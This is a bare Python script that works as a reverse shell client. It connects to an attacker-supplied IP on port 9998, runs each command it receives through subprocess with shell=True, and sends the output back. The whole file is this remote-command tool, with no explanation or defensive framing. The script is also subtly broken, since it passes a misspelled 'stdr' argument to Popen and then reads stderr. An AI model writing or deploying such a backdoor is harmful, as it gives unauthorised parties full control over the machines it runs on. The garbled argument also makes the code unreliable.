import socket
import subprocess

s = socket.socket()

host = input("Enter the IP address of the server: ")
port = 9998

s.connect((host,port))

while True:
    command = s.recv(1024)
    if not command:
        break
    cmd = subprocess.Popen(command,shell=True,stdr = subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
    cmd_bytes = cmd.stdout.read() + cmd.stderr.read()
    cmd_str = str(cmd_bytes)
    s.send(cmd_str.encode())